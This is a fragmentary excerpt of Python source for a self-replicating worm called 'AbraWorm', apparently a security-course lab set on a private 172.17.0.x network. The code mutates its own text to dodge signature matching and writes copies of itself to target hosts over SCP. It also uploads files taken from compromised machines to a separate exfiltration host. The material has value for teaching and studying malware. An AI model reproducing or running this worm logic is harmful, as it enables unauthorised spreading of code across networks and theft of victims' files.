...
def get_fresh_ipaddresses(how_many):
    if debug: return [f'172.17.0.{ip}' for ip in range(2, 11, 1)]
...
def mutate_code(code):
    ...
    for i in range(len(code)):
        if code[i].strip().startswith('#'):
            code[i] = code[i].rstrip() + ' ' + ''.join(random.choices(trigrams, k=random.randint(1, 10))) + '\n'
    ...
    forbidden=['else', 'except', 'finally']
    for i in range(len(code)):
        if re.match(r'^\w', code[i]):
            if random.random() < 0.5:
                continue
            tmp = code[i]
            if any([tmp.startswith(x) for x in forbidden]):
                continue
...
def write_itself_to_target(scpcon, ip_address):
    ...
    if not os.path.exists('tmp'):
        os.mkdir('tmp')
    with open (f'tmp/AbraWorm_{id}.py', 'w') as f:
        f.writelines(code)
    scpcon.put(f'tmp/AbraWorm_{id}.py', 'AbraWormPlus.py')
    # os.remove(f'tmp/AbraWorm_{id}.py')
            ...
            for ip_address in get_fresh_ipaddresses(NHOSTS):
                ...
                if len(files_of_interest_at_target) > 0:
                    ...
                    try:
                        ...
                        scpcon = scp.SCPClient(ssh.get_transport())
                        print("\nconnected to exhiltration host: 172.17.0.11\n")
                        for filename in files_of_interest_at_target:
                            target_file = ip_address.split('.')[-1] + '_' + filename
                            scpcon.put(filename, target_file)
                            print(f"uploaded {filename} as {target_file}\n")
                        scpcon.close()
                    except: 
